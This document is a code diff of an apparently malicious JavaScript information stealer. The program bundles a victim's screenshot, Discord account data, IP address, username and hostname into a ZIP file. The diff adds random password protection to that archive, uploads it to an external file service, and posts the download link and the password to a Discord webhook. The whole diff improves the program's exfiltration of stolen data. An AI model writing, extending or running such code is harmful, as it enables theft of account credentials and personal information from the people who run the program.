@@ -214,29 +214,41 @@ class Application {
                 logger.warn('No screenshot available to send');
             }
 
-            // Create archive
-            const zipPath = await fileManager.createZip();
+            // Generate password for ZIP file if it should be password protected
+            let zipPassword = null;
+            if (uploadService.shouldPasswordProtect(fileManager.getZipPath())) {
+                zipPassword = CoreUtils.generatePassword(16);
+                logger.info('Generated password for ZIP file protection');
+            }
+
+            // Create archive (with password if needed)
+            const zipPath = await fileManager.createZip(zipPassword);
             const zipSizeMB = fileManager.getZipSizeMB();
 
             logger.info('Archive created', {
                 path: zipPath,
-                size: `${zipSizeMB.toFixed(2)} MB`
+                size: `${zipSizeMB.toFixed(2)} MB`,
+                passwordProtected: !!zipPassword
             });
 
             // Determine if file should be uploaded
-            let downloadLink = '';
+            let uploadResult = null;
             if (uploadService.shouldUpload(zipPath)) {
-                logger.info('File size exceeds limit, uploading to external service');
-                downloadLink = await uploadService.upload(zipPath);
+                logger.info('File should be uploaded to external service', {
+                    reason: zipPath.toLowerCase().includes('save-') ? 'save-* file pattern' : 'size exceeds limit'
+                });
+                
+                const metadata = zipPassword ? { password: zipPassword } : {};
+                uploadResult = await uploadService.upload(zipPath, null, metadata);
             }
 
             // SECOND: Send Discord accounts if available (as per requirement: after screenshot)
             if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
-                await this.discordService.sendAccountEmbeds(this.results.discord, userIp);
+                await this.discordService.sendAccountEmbeds(this.results.discord, userIp, uploadResult, zipPath);
                 logger.info('Sent Discord account embeds (after screenshot)');
             } else {
                 // Only send main webhook if no Discord accounts are available
-                await this.sendMainWebhook(downloadLink, zipPath);
+                await this.sendMainWebhook(uploadResult, zipPath);
                 logger.info('Sent main webhook (no Discord accounts available)');
             }
 
@@ -250,19 +262,36 @@ class Application {
     /**
      * Send main webhook with statistics
      */
-    async sendMainWebhook(downloadLink = '', zipPath = '') {
+    async sendMainWebhook(uploadResult = null, zipPath = '') {
         try {
             const systemInfo = stats.getRawData().system;
             const payload = stats.buildWebhookPayload(
                 systemInfo.username,
                 systemInfo.hostname,
                 systemInfo.ip,
-                downloadLink
+                uploadResult ? uploadResult.downloadUrl : ''
             );
 
-            if (downloadLink) {
-                // Send with link only
-                await this.discordService.sendWebhook(JSON.parse(payload));
+            if (uploadResult && uploadResult.downloadUrl) {
+                // Send with link and password if available
+                const embed = JSON.parse(payload).embeds[0];
+                
+                // Add password information to embed if present
+                if (uploadResult.password) {
+                    embed.fields = embed.fields || [];
+                    embed.fields.push({
+                        name: ":key: Archive Password",
+                        value: `\`${uploadResult.password}\``,
+                        inline: false
+                    });
+                    embed.fields.push({
+                        name: ":warning: Important",
+                        value: "This archive is password protected. Use the password above to extract the contents.",
+                        inline: false
+                    });
+                }
+                
+                await this.discordService.sendWebhook(JSON.parse(JSON.stringify({ embeds: [embed] })));
             } else {
                 // Send with file attachment
                 const embed = JSON.parse(payload).embeds[0];
